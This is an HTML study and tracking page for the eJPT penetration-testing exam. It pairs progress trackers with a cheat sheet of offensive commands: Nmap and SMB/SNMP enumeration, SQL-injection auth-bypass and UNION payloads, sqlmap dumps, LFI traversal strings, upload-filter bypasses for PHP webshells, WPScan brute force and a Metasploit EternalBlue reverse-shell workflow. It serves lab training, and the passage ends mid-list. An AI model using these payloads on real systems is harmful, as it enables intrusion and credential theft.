@@ -1,0 +1,1183 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>eJPT Study Reference</title>
+<style>
+  :root{
+    --bg:#121417; --panel:#1a1d23; --panel2:#0b0d10; --border:#2a2e37;
+    --text:#e6e8ec; --muted:#8891a1;
+    --crit:#fff176; --crit-text:#3a2f00;
+    --imp:#7fd8d0; --imp-text:#04302c;
+    --danger:#e5484d;
+  }
+  html[data-theme="light"]{
+    --bg:#f4f5f7; --panel:#ffffff; --panel2:#eef0f3; --border:#dde1e6;
+    --text:#1a1d23; --muted:#5a6270;
+    --crit:#fff176; --crit-text:#3a2f00;
+    --imp:#0f8f83; --imp-text:#ffffff;
+    --danger:#d92d3a;
+  }
+  *{box-sizing:border-box;}
+  body{margin:0; background:var(--bg); color:var(--text);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; line-height:1.5;}
+  .wrap{max-width:1080px; margin:0 auto; padding:20px 18px 80px;}
+
+  header{position:sticky; top:0; z-index:20; background:var(--bg); padding:14px 0 12px; border-bottom:1px solid var(--border); margin-bottom:20px;}
+  .headrow{display:flex; align-items:center; justify-content:space-between; flex-wrap:wrap; gap:10px;}
+  .brand{display:flex; align-items:center; gap:10px;}
+  .brand h1{font-size:17px; margin:0; letter-spacing:.02em;}
+  .saved{font-size:11px; color:var(--imp); display:flex; align-items:center; gap:4px; opacity:0; transition:opacity .3s;}
+  .saved.show{opacity:1;}
+  .toolbar{display:flex; gap:8px; flex-wrap:wrap;}
+  button{
+    font:inherit; font-size:12.5px; font-weight:600; letter-spacing:.02em; cursor:pointer;
+    background:var(--panel); color:var(--text); border:1px solid var(--border); border-radius:7px;
+    padding:7px 12px; transition:background .15s, border-color .15s;
+  }
+  button:hover{border-color:var(--imp);}
+  button.primary{background:var(--imp); color:var(--imp-text); border-color:var(--imp);}
+  button.danger{color:var(--danger); border-color:var(--danger);}
+  button.danger:hover{background:var(--danger); color:#fff;}
+  button.icon{padding:7px 9px;}
+  input[type=file]{display:none;}
+
+  .timerbar{display:flex; align-items:center; gap:16px; flex-wrap:wrap; margin-top:12px; font-size:13px;}
+  .timerbar .stat{background:var(--panel); border:1px solid var(--border); border-radius:8px; padding:8px 14px;}
+  .timerbar .stat b{display:block; font-size:18px; font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;}
+  .timerbar .stat.warn b{color:var(--crit);}
+  .timerbar .stat.over b{color:var(--danger);}
+  .timerbar .stat.critical b{color:var(--danger); animation:pulseWarn 1.4s ease-in-out infinite;}
+  @keyframes pulseWarn{0%,100%{opacity:1;}50%{opacity:.5;}}
+  .timerbar input[type=number]{width:60px; background:var(--panel2); border:1px solid var(--border); color:var(--text); border-radius:6px; padding:5px 7px; font:inherit;}
+
+  .coveragebar{margin-top:10px; display:flex; align-items:center; gap:10px; font-size:11.5px; color:var(--muted); flex-wrap:wrap;}
+  .cov-track{flex:1; height:6px; background:var(--panel2); border:1px solid var(--border); border-radius:4px; overflow:hidden; min-width:120px; max-width:260px;}
+  .cov-fill{height:100%; background:var(--imp); width:0%; transition:width .25s ease;}
+
+  .undo-toast{position:fixed; bottom:20px; left:50%; transform:translateX(-50%); background:var(--panel); border:1px solid var(--border); border-radius:8px; padding:9px 10px 9px 16px; display:flex; align-items:center; gap:12px; box-shadow:0 6px 20px rgba(0,0,0,.35); z-index:50; font-size:13px;}
+
+  h2.section{font-size:15px; margin:32px 0 4px; padding-bottom:8px; border-bottom:2px solid var(--border); color:var(--text); display:flex; align-items:center; justify-content:space-between;}
+  .section-sub{color:var(--muted); font-size:12.5px; margin:0 0 12px;}
+
+  .card{background:var(--panel); border:1px solid var(--border); border-radius:10px; overflow:hidden;}
+
+  /* Questions */
+  .qrow{display:flex; align-items:flex-start; gap:10px; padding:10px 14px; border-bottom:1px solid var(--border);}
+  .qrow:last-child{border-bottom:none;}
+  .qrow input[type=checkbox]{margin-top:4px; width:16px; height:16px; accent-color:var(--imp); flex-shrink:0; cursor:pointer;}
+  .qrow .qlabel{width:130px; flex-shrink:0; font-weight:600; font-size:13px; background:transparent; border:none; color:var(--text); font:inherit;}
+  .qrow .qconf{flex-shrink:0; width:96px; background:var(--panel2); border:1px solid var(--border); border-radius:6px; padding:5px 6px; color:var(--text); font:inherit; font-size:11.5px;}
+  .qrow .qconf.conf-low{border-color:var(--danger); color:var(--danger);}
+  .qrow .qconf.conf-medium{border-color:var(--crit); color:var(--crit);}
+  .qrow .qconf.conf-high{border-color:var(--imp); color:var(--imp);}
+  .qrow .qnote{flex:1; background:var(--panel2); border:1px solid var(--border); border-radius:6px; padding:6px 9px; color:var(--text); font:inherit; font-size:13px; resize:vertical; min-height:34px;}
+  .qrow.done{opacity:.55;}
+  .qrow.done .qlabel{text-decoration:line-through;}
+  .qrow .del{flex-shrink:0;}
+
+  /* Tables */
+  table.dyn{width:100%; border-collapse:collapse; font-size:12.5px;}
+  table.dyn th{background:var(--panel2); color:var(--muted); text-align:left; padding:8px 10px; font-weight:600; border-bottom:1px solid var(--border);}
+  table.dyn td{padding:4px 6px; border-bottom:1px solid var(--border); vertical-align:top;}
+  table.dyn tr:last-child td{border-bottom:none;}
+  table.dyn input, table.dyn textarea{
+    width:100%; background:transparent; border:1px solid transparent; border-radius:5px; padding:5px 6px;
+    color:var(--text); font:inherit; font-size:12.5px; resize:vertical;
+  }
+  table.dyn input:hover, table.dyn textarea:hover, table.dyn input:focus, table.dyn textarea:focus{
+    background:var(--panel2); border-color:var(--border); outline:none;
+  }
+  .tbl-actions{padding:10px 14px; display:flex; justify-content:flex-end;}
+  .del-row{background:none; border:none; color:var(--muted); cursor:pointer; font-size:14px; padding:4px 6px;}
+  .del-row:hover{color:var(--danger);}
+
+  table.dyn select{
+    width:100%; background:transparent; border:1px solid transparent; border-radius:5px; padding:5px 4px;
+    color:var(--text); font:inherit; font-size:12.5px;
+  }
+  table.dyn select:hover, table.dyn select:focus{ background:var(--panel2); border-color:var(--border); outline:none; }
+  .flag-dot{display:block; width:11px; height:11px; border-radius:50%; margin:0 auto; background:var(--border); transition:background .15s;}
+  .flag-dot.high{background:var(--danger);}
+  .flag-dot.med{background:var(--crit);}
+  tr.status-exploited td:nth-child(6) select{color:var(--danger); font-weight:700;}
+
+  /* ATT&CK grid */
+  .attck-grid{display:grid; grid-template-columns:repeat(auto-fill, minmax(230px,1fr)); gap:10px; padding:14px;}
+  .attck-item{display:flex; align-items:center; gap:8px; background:var(--panel2); border:1px solid var(--border); border-radius:7px; padding:8px 10px;}
+  .attck-item input[type=checkbox]{accent-color:var(--crit); width:15px; height:15px; flex-shrink:0; cursor:pointer;}
+  .attck-item .tname{font-size:12.5px; font-weight:600; flex:1;}
+  .attck-item input[type=text]{width:90px; background:transparent; border:1px solid var(--border); border-radius:5px; padding:4px 6px; color:var(--text); font:inherit; font-size:11.5px;}
+  .attck-item.on{border-color:var(--crit);}
+
+  /* Phases */
+  .phase-grid{display:flex; flex-wrap:wrap; gap:10px; padding:14px;}
+  .phase-item{background:var(--panel2); border:1px solid var(--border); border-radius:8px; padding:10px 14px; min-width:170px; flex:1;}
+  .phase-item .pname{font-weight:600; font-size:13px; margin-bottom:6px;}
+  .phase-item select{width:100%; background:var(--panel); border:1px solid var(--border); border-radius:6px; padding:6px 8px; color:var(--text); font:inherit; font-size:12.5px;}
+
+  textarea.scratch{width:100%; min-height:160px; background:var(--panel); border:1px solid var(--border); border-radius:10px; padding:14px; color:var(--text); font:inherit; font-size:13px; resize:vertical;}
+
+  .addrow-bar{padding:10px 14px; border-top:1px solid var(--border);}
+  .addrow-bar button{width:100%;}
+
+  /* Quick Reference / Cheat Sheet */
+  .refwrap details{border-bottom:1px solid var(--border);}
+  .refwrap details:last-child{border-bottom:none;}
+  .refwrap summary{list-style:none; cursor:pointer; padding:10px 14px; font-size:13.5px; display:flex; align-items:center; gap:8px;}
+  .refwrap summary::-webkit-details-marker{display:none;}
+  .refwrap summary::before{content:"▸"; color:var(--muted); font-size:11px; transition:transform .15s ease; flex-shrink:0;}
+  .refwrap details[open] summary::before{transform:rotate(90deg);}
+  .refwrap mark{padding:1px 5px; border-radius:4px; font-weight:600;}
+  .refwrap mark.crit{background:var(--crit); color:var(--crit-text);}
+  .refwrap mark.imp{background:var(--imp); color:var(--imp-text);}
+  .refbody{margin:0 4px 14px 22px; padding:10px 14px; background:var(--panel2); border-radius:8px; font-size:12.5px; color:var(--muted); border-left:3px solid var(--border);}
+  .refbody p{margin:0 0 8px;}
+  .refbody p:last-child{margin-bottom:0;}
+  .refbody h4{font-size:11px; margin:10px 0 4px; color:var(--muted); text-transform:uppercase; letter-spacing:.03em;}
+  .refbody h4:first-child{margin-top:0;}
+  .refbody ul.bullets{margin:2px 0 8px; padding-left:16px; list-style:disc;}
+  .refbody ul.bullets li{margin:2px 0;}
+  .refbody ol.steps{margin:2px 0 8px; padding-left:18px; list-style:decimal;}
+  .refbody ol.steps li{margin:2px 0;}
+  .refbody pre{background:var(--panel); border:1px solid var(--border); border-radius:6px; padding:9px 11px; overflow-x:auto; font-size:11.5px; line-height:1.5; margin:6px 0 10px; color:var(--text); font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; white-space:pre;}
+  .refbody code{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; background:var(--panel); padding:1px 5px; border-radius:4px; font-size:11.5px;}
+  .refbody table.ref-table{width:100%; border-collapse:collapse; font-size:11.5px; margin:6px 0 10px;}
+  .refbody table.ref-table th, .refbody table.ref-table td{border:1px solid var(--border); padding:5px 8px; text-align:left;}
+  .refbody table.ref-table th{background:var(--panel); color:var(--muted); font-weight:600;}
+
+  footer{margin-top:40px; font-size:11.5px; color:var(--muted); text-align:center;}
+
+  @media (max-width:640px){
+    .qrow{flex-wrap:wrap;}
+    .qrow .qlabel{width:100%;}
+    table.dyn{display:block; overflow-x:auto; white-space:nowrap;}
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <header>
+    <div class="headrow">
+      <div class="brand">
+        <h1>🎯 eJPT STUDY REFERENCE</h1>
+        <span class="saved" id="savedIndicator">✓ SAVED</span>
+      </div>
+      <div class="toolbar">
+        <button class="icon" id="themeToggle" title="Toggle light/dark">☀</button>
+        <button id="btnExportJson">JSON EXPORT</button>
+        <button id="btnExportMd">MD REPORT EXPORT</button>
+        <button id="btnImport">IMPORT</button>
+        <input type="file" id="fileImport" accept="application/json">
+        <button class="danger" id="btnReset">RESET</button>
+      </div>
+    </div>
+
+    <div class="timerbar">
+      <div class="stat" id="elapsedStat"><span>Elapsed</span><b id="elapsedVal">00:00:00</b></div>
+      <div class="stat" id="remainStat"><span>Remaining (of <span id="targetHoursLabel">48</span>h)</span><b id="remainVal">48:00:00</b></div>
+      <div class="stat" id="paceStat"><span>Pace (per open question)</span><b id="paceVal">—</b></div>
+      <div>
+        <button id="btnStartTimer" class="primary">Start Exam Clock</button>
+        <button id="btnClearTimer">Clear Clock</button>
+      </div>
+      <div>
+        Target hours: <input type="number" id="targetHours" value="48" min="1" max="96">
+      </div>
+    </div>
+
+    <div class="coveragebar">
+      <div class="cov-track"><div class="cov-fill" id="covFill"></div></div>
+      <span id="covLabel">0/45 questions answered · 0/7 phases done</span>
+    </div>
+  </header>
+
+  <p class="section-sub" style="margin-top:-8px;">Everything here autosaves to this browser (localStorage) as you type — nothing is sent anywhere. Use <b>JSON EXPORT</b> to back up your progress or move it to another device, and <b>MD REPORT EXPORT</b> at the end to generate a starting draft of your engagement write-up from everything you tracked.</p>
+
+  <details class="card" style="margin-bottom:24px; padding:0;">
+    <summary style="cursor:pointer; padding:12px 16px; font-weight:600; font-size:13.5px; list-style:none;">ℹ️ How to use this reference (click to expand)</summary>
+    <div style="padding:0 16px 16px; font-size:13px; color:var(--muted);">
+      <p style="margin:6px 0;">Built around the eJPT practical format: a self-paced lab window (defaulted here to 48 hours — adjust via <b>Target hours</b> if yours differs) with 45 questions/flags tied directly to what you actually find and exploit on the network, not multiple-choice trivia. If your own exam invite states a different time window, adjust it below to match.</p>
+      <ul style="margin:6px 0; padding-left:20px;">
+        <li><b>Everything is 100% local to your browser.</b> Nothing here touches a server — no login, no analytics, no data collection of any kind. That also means: it's tied to <i>this browser, on this device</i>. Switching browsers/computers won't carry your progress over unless you use JSON Export/Import.</li>
+        <li>Click <b>Start Exam Clock</b> the moment you begin — it'll track elapsed/remaining time even if you close the tab and come back (as long as it's the same browser).</li>
+        <li>Rename the Q1–Q45 labels to match your actual question numbers/flag names if you want it to mirror your specific exam sheet.</li>
+        <li>The <b>Pace</b> stat updates once the clock is running — remaining time ÷ open (unchecked) questions, so you always know roughly how long you can spend on what's left. It turns yellow/red as time per question gets tight.</li>
+        <li>Each question has an optional <b>confidence</b> dropdown (Low/Medium/High) — a quick way to flag which answers you should double-check before submitting.</li>
+        <li>Deleted a row by mistake? An <b>Undo</b> button appears at the bottom of the screen for a few seconds after any delete (Questions, Credentials &amp; Loot, Timeline, Host &amp; Service Map).</li>
+        <li><b>Export JSON regularly</b> — clearing browser data, using incognito mode, or switching machines will wipe local storage. With a 48-hour window you'll likely close the laptop and come back more than once; a JSON backup is the only way to recover your progress if something goes wrong locally.</li>
+        <li><b>MD Report Export</b> pulls everything you've tracked into a draft engagement write-up — it's a starting point, not a finished report.</li>
+      </ul>
+      <p style="margin:6px 0;">Independent study aid built by a fellow candidate — not affiliated with or endorsed by INE / eLearnSecurity.</p>
+    </div>
+  </details>
+
+  <!-- QUESTIONS -->
+  <h2 class="section">Questions / Flags</h2>
+  <p class="section-sub">Default is 45 rows to match the eJPT question count — add or remove as needed. Use the note field for the answer/flag value itself, or a pointer to which host it came from.</p>
+  <div class="card" id="questionsCard"></div>
+  <div class="addrow-bar"><button id="addQuestion">+ Add question</button></div>
+
+  <!-- CREDENTIALS & LOOT -->
+  <h2 class="section">Credentials &amp; Loot</h2>
+  <p class="section-sub">Every username, password, hash, key, or token you recover — the single table you'll be searching back through most often once you start chaining hosts together.</p>
+  <div class="card">
+    <table class="dyn" id="lootTable">
+      <thead><tr><th style="width:14%;">Type</th><th style="width:24%;">Value</th><th style="width:22%;">Host / Service found on</th><th>Notes</th><th style="width:30px;"></th></tr></thead>
+      <tbody id="lootBody"></tbody>
+    </table>
+    <div class="tbl-actions"><button id="addLoot">+ Add credential / loot</button></div>
+  </div>
+
+  <!-- TIMELINE -->
+  <h2 class="section">Attack Timeline</h2>
+  <p class="section-sub">Timestamp / Host / Tool-Technique / Finding / ATT&amp;CK — log this every time a scan, exploit, or enumeration step actually produces something. This is what lets you reconstruct your own chain of access later without re-deriving it from memory.</p>
+  <div class="card">
+    <table class="dyn" id="timelineTable">
+      <thead><tr><th style="width:12%;">Timestamp</th><th style="width:16%;">Host</th><th style="width:16%;">Tool / Technique</th><th>Finding</th><th style="width:16%;">ATT&amp;CK / Notes</th><th style="width:30px;"></th></tr></thead>
+      <tbody id="timelineBody"></tbody>
+    </table>
+    <div class="tbl-actions"><button id="addTimeline">+ Add event</button></div>
+  </div>
+
+  <!-- HOST & SERVICE MAP -->
+  <h2 class="section">Host &amp; Service Map</h2>
+  <p class="section-sub">One row per host/port/service you've touched — this is your live picture of the network: what's been found, what's vulnerable, what's actually been popped, and what access level you're sitting at on each box. The colored dot flags Exploited in red and Vulnerable in orange so you can scan for your best next target fast.</p>
+  <div class="card">
+    <div style="overflow-x:auto;">
+    <table class="dyn" id="hostsTable" style="min-width:1000px;">
+      <thead><tr><th style="width:26px;"></th><th style="width:12%;">Host (IP)</th><th style="width:14%;">Hostname / OS</th><th style="width:12%;">Port / Service</th><th style="width:14%;">Version / CVE</th><th style="width:11%;">Status</th><th style="width:12%;">Access Level</th><th>Notes</th><th style="width:30px;"></th></tr></thead>
+      <tbody id="hostsBody"></tbody>
+    </table>
+    </div>
+    <div class="tbl-actions"><button id="addHost">+ Add host / service</button></div>
+  </div>
+
+  <!-- ATT&CK -->
+  <h2 class="section">MITRE ATT&amp;CK Tactics Used</h2>
+  <p class="section-sub">Check off each tactic as you actually use it against a target, and note the technique ID if you have one — the same framework blue teams use to describe you, so it doubles as a sanity check that your report covers the full chain, not just the exploit that got you in.</p>
+  <div class="card"><div class="attck-grid" id="attckGrid"></div></div>
+
+  <!-- PHASES -->
+  <h2 class="section">Attack Phase Status</h2>
+  <div class="card"><div class="phase-grid" id="phaseGrid"></div></div>
+
+  <!-- QUICK REFERENCE -->
+  <h2 class="section">Quick Reference / Cheat Sheet</h2>
+  <p class="section-sub">Condensed commands and workflows so you don't have to leave this tab — each one also explains <i>why</i> you'd reach for it, not just the syntax, so you can adapt on the fly when a target doesn't match the exact scenario below.</p>
+  <div class="card refwrap">
+
+    <details>
+      <summary><mark class="crit">Nmap — scanning workflow</mark></summary>
+      <div class="refbody">
+        <p>The point of scanning in stages, instead of one giant scan, is speed and signal: a fast sweep tells you which hosts are even worth spending time on before you commit to a slow, thorough scan against all of them.</p>
+        <h4>1. Host discovery — who's alive</h4>
+<pre>nmap -sn 10.0.0.0/24            # ping sweep, no port scan — fastest way to build a target list
+nmap -sn -PR 10.0.0.0/24        # ARP-based, most reliable on a local subnet (works even if ICMP is blocked)</pre>
+        <h4>2. Fast full-port sweep — don't miss a service on an odd port</h4>
+<pre>nmap -p- --min-rate 5000 -T4 10.0.0.5
+# Why: the default top-1000 port scan is exactly what a badly-hidden flag service loves to sit outside of.
+# Feed the ports this finds into a slower, detailed scan next — don't -A a /24, it'll take forever.</pre>
+        <h4>3. Detailed scan on the ports you actually found</h4>
+<pre>nmap -sC -sV -p 21,22,80,445 -oN nmap-10.0.0.5.txt 10.0.0.5
+# -sC = default script set (safe enumeration scripts), -sV = version detection
+# Why -oN always: you will want to grep back through this later, don't rely on scrollback</pre>
+        <h4>Targeted NSE scripts worth knowing by name</h4>
+        <table class="ref-table">
+          <tr><th>Script</th><th>Why you'd run it</th></tr>
+          <tr><td><code>smb-enum-shares</code>, <code>smb-enum-users</code>, <code>smb-os-discovery</code></td><td>SMB is one of the highest-yield services on eJPT-style networks — shares/users often hand you a foothold or username list directly</td></tr>
+          <tr><td><code>http-enum</code>, <code>http-title</code>, <code>http-methods</code></td><td>Fast first look at a web service before you switch to a dedicated content-discovery tool</td></tr>
+          <tr><td><code>ftp-anon</code></td><td>Confirms anonymous FTP login in one shot instead of testing it by hand</td></tr>
+          <tr><td><code>vuln</code> category (<code>--script vuln</code>)</td><td>Runs every vulnerability-detection script Nmap ships with — slow, but a good "did I miss something obvious" pass on a host you're stuck on</td></tr>
+        </table>
+        <h4>UDP — don't forget it</h4>
+<pre>nmap -sU --top-ports 20 -T4 10.0.0.5
+# Why: SNMP (161), TFTP (69), and DNS (53) all live here and are commonly the intended path on
+# an "how did they get in" question — a TCP-only scan will miss all of them silently.</pre>
+      </div>
+    </details>
+
+    <details>
+      <summary><mark class="crit">Enumeration — service by service</mark></summary>
+      <div class="refbody">
+        <p>The habit that matters more than any single command: enumerate every open port before exploiting any of them. A box with 6 open ports and one flashy vuln on port 80 often has the actual intended path sitting quietly on port 21 or 445.</p>
+        <h4>Some answers aren't a scan at all — read the site like a visitor first</h4>
+        <p>Before reaching for any tool: open the target in a browser and read it — About/Contact/Careers pages, footer text, blog posts. Questions like "what time does the working day start" or "who is the IT contact" are answered by reading the page, not by scanning it. Treat a normal browse-through as step zero, not an afterthought.</p>
+        <h4>Identifying the OS / Linux distro remotely</h4>
+<pre>nmap -O 10.0.0.5                           # active OS fingerprinting — needs at least one open + one closed port to be reliable
+nc -vn 10.0.0.5 22                         # SSH banner often names the distro directly, e.g. "OpenSSH_7.6p1 Ubuntu-4ubuntu0.3"
+curl -I http://10.0.0.5                    # HTTP Server header sometimes includes the distro, e.g. "Apache/2.4.29 (Ubuntu)"</pre>
+        <p>Why banner grabs beat <code>-O</code> half the time: active OS fingerprinting needs specific port conditions to be accurate and is easy to get wrong on a filtered host — a service banner that just states the distro name outright is a faster and more reliable answer when one's available. Once you have any shell at all, <code>cat /etc/os-release</code> settles it definitively.</p>
+        <h4>SMB (139/445)</h4>
+<pre>smbclient -L //10.0.0.5/ -N              # -N = no password, tests anonymous/null session
+enum4linux -a 10.0.0.5                    # broad sweep: users, shares, groups, policy, OS info
+crackmapexec smb 10.0.0.5 -u '' -p ''    # confirms null-session access fast, also fingerprints the OS/domain</pre>
+        <p><b>Why check null sessions first:</b> a surprising number of boxes leak a full share/user listing to an unauthenticated connection — this is usually the fastest win available and costs one command to rule in or out.</p>
+        <h4>FTP (21)</h4>
+<pre>ftp 10.0.0.5                              # try anonymous / anonymous
+nmap --script ftp-anon -p21 10.0.0.5      # same check, non-interactive</pre>
+        <p>Why: anonymous FTP with a writable directory is a classic and still very common initial-access or file-drop vector.</p>
+        <h4>SSH (22)</h4>
+<pre>ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 user@10.0.0.5   # legacy algo support for old boxes
+nc -vn 10.0.0.5 22                        # banner grab — version string alone can date a known-vuln build</pre>
+        <h4>HTTP/HTTPS (80/443/8080…)</h4>
+<pre>whatweb http://10.0.0.5                   # fingerprints CMS/framework/server in one request
+gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak
+nikto -h http://10.0.0.5                  # broad automated vuln/misconfig sweep, noisy but fast</pre>
+        <p>Why <code>-x php,txt,bak</code> matters: a directory brute force with no extensions will walk right past a <code>backup.php.bak</code> or <code>config.txt</code> sitting next to the real app.</p>
+        <h4>SNMP (161/UDP)</h4>
+<pre>snmpwalk -c public -v1 10.0.0.5           # 'public' is the default read-only community string — always try it first
+onesixtyone -c community-strings.txt 10.0.0.5</pre>
+        <p>Why: SNMP with the default community string can leak running processes, installed software, and sometimes even usernames/routes — high value for almost no effort.</p>
+        <h4>MySQL / MSSQL</h4>
+<pre>mysql -h 10.0.0.5 -u root -p              # try root with a blank password first
+crackmapexec mssql 10.0.0.5 -u sa -p ''   # sa with blank/default password is a very common miss</pre>
+      </div>
+    </details>
+
+    <details>
+      <summary><mark class="crit">Web App Testing — quick reference</mark></summary>
+      <div class="refbody">
+        <p>Manual-first, tool-second — running sqlmap blind against every field burns time and can miss a vuln a two-second manual test would have caught immediately.</p>
+        <h4>SQL Injection — manual probes before sqlmap</h4>
+<pre>' OR '1'='1                 # classic auth-bypass test in a login form
+' OR '1'='1'--  -            # comment out the rest of the query (MySQL/MSSQL)
+1' ORDER BY 5--  -            # binary-search the column count before a UNION attack
+1' UNION SELECT null,null,null--  -   # once column count is known, start pulling data</pre>
+<pre># Once confirmed, let sqlmap do the heavy lifting:
+sqlmap -u "http://10.0.0.5/item.php?id=1" --dbs
+sqlmap -u "http://10.0.0.5/item.php?id=1" -D appdb --tables
+sqlmap -u "http://10.0.0.5/item.php?id=1" -D appdb -T users --dump</pre>
+        <p>Why manual probes first: a five-second single-quote test tells you whether it's even worth pointing sqlmap at the field — sqlmap against a non-vulnerable param just wastes your 48 hours.</p>
+        <h4>LFI / RFI</h4>
+<pre>http://10.0.0.5/index.php?page=../../../../etc/passwd
+http://10.0.0.5/index.php?page=....//....//etc/passwd    # filter-bypass variant for naive str_replace filters
+http://10.0.0.5/index.php?page=php://filter/convert.base64-encode/resource=config.php</pre>
+        <p>Why <code>php://filter</code> matters: when a page includes <code>.php</code> files directly it'll execute them instead of showing source — base64-wrapping forces it to show you the raw source instead, often exposing DB credentials in a config file.</p>
+        <h4>WordPress — WPScan</h4>
+<pre>wpscan --url http://10.0.0.5 --enumerate u          # usernames
+wpscan --url http://10.0.0.5 --enumerate t           # installed/active themes
+wpscan --url http://10.0.0.5 --enumerate p           # installed plugins
+wpscan --url http://10.0.0.5 --enumerate vp,vt       # vulnerable plugins/themes only, with a free API token this pulls known CVEs
+wpscan --url http://10.0.0.5 -U admin -P rockyou.txt # once you have a username, brute the login</pre>
+        <p>Why WPScan over manual browsing: the active theme, plugin list, and username enumeration are all things WordPress exposes through predictable paths/REST endpoints (<code>/wp-json/wp/v2/users</code>, theme CSS headers) — WPScan just automates reading those instead of you hunting for them by hand.</p>
+        <h4>Drupal — quick enumeration</h4>
+<pre>curl http://10.0.0.5/CHANGELOG.txt          # version number, usually sitting right there unauthenticated
+curl http://10.0.0.5/user/1                 # user ID 1 is almost always the original admin account — confirms the username even if it 404s politely
+droopescan scan drupal -u http://10.0.0.5   # modules/version/plugins in one automated pass</pre>
+        <p>Why <code>settings.php</code> matters for credential questions: Drupal's database connection details (host, DB name, <b>username and password</b>) live in plaintext at <code>sites/default/settings.php</code>. If you have any file-read primitive on the box — LFI, a misconfigured share, or a shell — that file is where a "what's the MySQL root password" question resolves. Known high-impact Drupal CVEs worth recognizing by name: <b>Drupalgeddon</b> (CVE-2014-3704, SQLi via the user-registration form) and <b>Drupalgeddon2</b> (CVE-2018-7600, pre-auth RCE) — both are common in training environments precisely because they're so reliable.</p>
+        <h4>File upload bypass</h4>
+        <ul class="bullets">
+          <li>Double extension: <code>shell.php.jpg</code> — works when the check only looks at the last extension server-side but the web server still executes on <code>.php</code> anywhere in the name</li>
+          <li>Null byte (older PHP): <code>shell.php%00.jpg</code></li>
+          <li>Content-Type spoof: set the multipart Content-Type header to <code>image/jpeg</code> while the actual file content is a PHP webshell — many checks only validate the header, not the bytes</li>
+          <li>Alternate executable extensions if <code>.php</code> is blocklisted: <code>.phtml</code>, <code>.php5</code>, <code>.pht</code></li>
+        </ul>
+        <h4>Quick checklist for any web target</h4>
+        <ul class="bullets">
+          <li>View source + <code>robots.txt</code> + <code>/sitemap.xml</code> — free hints at hidden paths, sometimes literally in a comment</li>
+          <li>Every input field: does it reflect unescaped? (XSS) Does an apostrophe error the page? (SQLi)</li>
+          <li>Every file-handling parameter: can it be redirected to a local path? (LFI)</li>
+          <li>Login forms: default creds first (<code>admin:admin</code>, <code>admin:password</code>) before anything fancier</li>
+        </ul>
+        <h4>Directory / path brute force — which wordlist, and what to check by hand</h4>
+<pre>gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/dirb/common.txt -x php,txt,bak,zip
+gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ffuf -u http://10.0.0.5/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403</pre>
+        <p><b>Wordlist choice:</b> dirb's <code>common.txt</code> (~4,600 entries) is fast and catches the obvious stuff first — start there. If it comes back empty, go bigger with a SecLists list (<code>raft-medium-directories.txt</code> or <code>directory-list-2.3-medium.txt</code>) before assuming there's nothing to find. <b><code>rockyou.txt</code> is a password wordlist</b> (14M leaked real-world passwords, used with Hydra/John/Hashcat for login brute force — see the Password Attacks card), not a directory wordlist — an easy pair to mix up but they solve different problems.</p>
+        <table class="ref-table">
+          <tr><th>Path</th><th>Why it's worth checking</th></tr>
+          <tr><td><code>/robots.txt</code>, <code>/sitemap.xml</code></td><td>Free, unauthenticated hints at paths the site doesn't want indexed — sometimes the hidden directory name is spelled out directly</td></tr>
+          <tr><td><code>/.git/</code> or <code>/.git/config</code></td><td>If exposed, the entire source tree (and commit history — sometimes with old hardcoded secrets) can be pulled back out with a tool like <code>git-dumper</code></td></tr>
+          <tr><td><code>/backup</code>, <code>/backups</code>, <code>/old</code>, <code>*.bak</code>, <code>*.zip</code></td><td>Common names admins leave behind for forgotten database or source dumps</td></tr>
+          <tr><td><code>/admin</code>, <code>/administrator</code>, <code>/wp-admin</code>, <code>/manager/html</code> (Tomcat)</td><td>Default admin-panel paths, one per platform — try the platform-specific one once <code>whatweb</code>/enumeration tells you what's running</td></tr>
+          <tr><td><code>/phpmyadmin</code></td><td>Extremely common exposed DB admin panel, frequently left on default/blank creds</td></tr>
+          <tr><td><code>/uploads</code>, <code>/files</code></td><td>Where a successful file-upload payload usually lands and gets served back to you — check here right after an upload-bypass win</td></tr>
+          <tr><td><code>/api</code>, <code>/api/v1</code></td><td>Modern apps often ship an undocumented API surface with looser auth checks than the main site</td></tr>
+          <tr><td><code>/.env</code>, <code>/config.php</code>, <code>/web.config</code></td><td>Config files that leak DB/API credentials in plaintext if the server ever serves them as static text instead of executing them</td></tr>
+          <tr><td><code>/server-status</code> (Apache)</td><td>Misconfigured Apache can expose a live list of current requests, sometimes with query strings/session data in them</td></tr>
+        </table>
+      </div>
+    </details>
+
+    <details>
+      <summary><mark class="crit">Metasploit &amp; msfvenom</mark></summary>
+      <div class="refbody">
+        <h4>Core workflow</h4>
+<pre>msfconsole -q
+search type:exploit platform:windows smb           # narrow by what you actually know about the target
+use exploit/windows/smb/ms17_010_eternalblue
+show options                                        # ALWAYS check this before setting anything — required options vary per module
+set RHOSTS 10.0.0.5
+set LHOST 10.0.0.10                                 # your attacking box's IP, for the callback
+set payload windows/x64/meterpreter/reverse_tcp
+run</pre>
+        <p>Why <code>show options</code> every time: the most common reason an exploit "doesn't work" isn't that it's patched — it's a missing required option (wrong RPORT, wrong target index, wrong payload architecture).</p>
+        <h4>Picking a module that lands you elevated, not just in</h4>
+        <p>Some exploit modules hand you SYSTEM/root directly because of <i>how</i> the vulnerable service runs, not because of anything extra you do afterward — worth recognizing which ones by name for "which module gives an elevated shell" style questions:</p>
+        <ul class="bullets">
+          <li><code>exploit/windows/smb/ms17_010_eternalblue</code> — SMB runs as SYSTEM, so a successful hit is SYSTEM immediately, no privesc step needed</li>
+          <li><code>exploit/windows/local/*</code> modules (run against an existing session) — purpose-built privesc exploits, e.g. <code>exploit/windows/local/bypassuac_injection</code> or a kernel exploit module, used once you already have a low-priv shell</li>
